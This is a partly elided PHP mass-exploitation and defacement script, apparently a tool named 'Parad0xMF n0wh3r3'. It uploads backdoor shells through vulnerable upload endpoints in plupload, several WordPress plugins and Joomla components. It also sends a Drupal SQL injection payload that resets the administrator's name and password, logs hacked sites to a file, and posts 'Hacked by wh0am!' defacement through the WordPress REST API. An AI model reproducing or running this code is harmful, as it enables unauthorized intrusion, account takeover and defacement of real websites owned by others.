...
$uploadfile="b4ckd00r/Parad0xMF.jpg";
$uploadfile2="b4ckd00r/Parad0xMF.php";
...
$result=curl_exec ($ch);
curl_close ($ch);
$result = $target."/js/plupload/examples/uploads/Parad0xMF.php";
$result = @file_get_contents("$result");
if(preg_match("/Hacked/",$result)){
echo $red."  [plupload] -============- ".$green." Done";
$hacked = fopen("result/Parad0xMF.txt","a+");
$def = $target."/js/plupload/examples/uploads/Parad0xMF.php";
fwrite($hacked,$def);
fwrite($hacked,"\n");
fclose($hacked);
}
...
$uploadfile="B4ckd00r/Parad0xMF.php";
$uploadfile=realpath($uploadfile) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
} else { // 
...
$uploadfile="b4ckd00r/Parad0xMF.gif";
$uploadfile=realpath($uploadfile) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
} else { // 
...
$m = date("m");
$y = date("y");
$result2 = $target."/wp-content/uploads/20$y/$m/Parad0xMF.gif";
...
$h = @get_headers("$target1");
if(!preg_match("/404/",$h[0])){
$uploadfile="b4ckd00r/Parad0xMF.txt";
$uploadfile=realpath($uploadfile) ;
if (function_exists('curl_file_create')) { // php 5.5+
  $cFile = curl_file_create($uploadfile);
} else { // 
...
$m = date("m");
$y = date("y");
$result2 = $target."/wp-content/uploads/20$y/$m/Parad0xMF.txt";
$h2 = @file_get_contents("$result2");
if(@preg_match("/wh0ami/",$h2)){
...
function wp_blazeS($target){
	...
	$orange = "\e[38;5;208m";
	$red    = "\e[91m";
$file = "b4ckd00r/Parad0xMF.php.gif";
$file = realpath($file);
if (function_exists('curl_file_create')) { // php 5.5+
...
$result=curl_exec ($ch);
curl_close ($ch);
$hack = $target."/wp-content/plugins/blaze-slide-show-for-wordpress/js/swfupload/js/Parad0xMF.php.gif";
$source = @file_get_contents("$hack");
if(preg_match("/h4ck3d/",$source)){
$hacked = fopen("result/Parad0xMF.txt","a+");
...
$m = date("m");
$y = date("y");
$hack = $target."/wp-content/uploads/20$y/$m/Parad0xMF.php";
$source2 = @file_get_contents("$hack");
if(preg_match("/h4ck3d/",$source2)){
...
$result=curl_exec ($ch);
curl_close ($ch);
$hack = $target."/wp-content/plugins/simple-ads-manager/Parad0xMF.php";
$source2 = @file_get_contents("$hack");
if(preg_match("/h4ck3d/",$source2)){
...
$result=curl_exec ($ch);
curl_close ($ch);
$hack = $target."/media/Parad0xMF.txt";
$source2 = @file_get_contents("$hack");
if(preg_match("/Nowhere/",$source2)){
...
$result= curl_exec ($ch);
curl_close ($ch);
$source = "$target/wp-content/uploads/settingsimages/Parad0xMF.html";
...
$result=curl_exec ($ch);
curl_close ($ch);
$result2 = $target."/wp-content/plugins/cherry-plugin/admin/import-export/Parad0xMF.php";
$h2 = @file_get_contents("$result2");
if(preg_match("/Parad0xMF/",$h2)){
echo $red."  [upload] -==============- ".$green." Done";
$hacked = fopen("result/Parad0xMF.txt","a+");
$def = $target."/"."Parad0xMF.html";
fwrite($hacked,$def);
fwrite($hacked,"\n");
echo $result2;
	}else{
...
function add_user($target){
    ...
    $url2 = $target.$log;
    $holako = "/?q=user";
    $post_data = "name[0;update users set name %3D 'Parad0xMF' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
    $params = array(
        'http' => array(
        'method' => 'POST',
...
$result = fopen("result/Parad0xMF.txt","a+");	
echo $red."  [add_user] ====> ".$green." Done !\n";
fwrite($result,$url2." => username : Parad0xMF  => password : admin");
fwrite($result,"\n");
fclose($result);
    } else {
...
function joom_down($url){
     $file1='b4ckd00r/Parad0xMF.zip';
     $file2='b4ckd00r/Parad0xMF.gif';
if (function_exists('curl_file_create')) { // php 5.5+
...
if (function_exists('curl_file_create')) { // php 5.5+
  ...
  $cFile2 = '@' . realpath($file2);
     ...
     $sco=($url).($bbb); 
        $post=array(
    'name'=>'Parad0xMF_wh0ami','mail'=>'SpyneT.Officiell@gmail.com','catlist'=>'1','file_upload'=> $cFile1 ,'filetitle' =>"Hacked by wh0am!",
...
$red    = "\e[91m";
$orange = "\e[38;5;208m";
$uploadfile="wh0ami.gif";
$uploadfile2="wh0ami.jpg";
...
$content = "
      HaCkEd bY wh0am!
	  Parad0xMF n0wh3r3 v1.0      
";
$file = "Parad0xMF.html";
$id = $rb."justracccwdata";
$target2 = $target."/wp-json/wp/v2/posts/1";
$data = array("id" => $id,"title" => "Hacked by wh0am! ","slug" => $file , "content" => $content);                                                                    
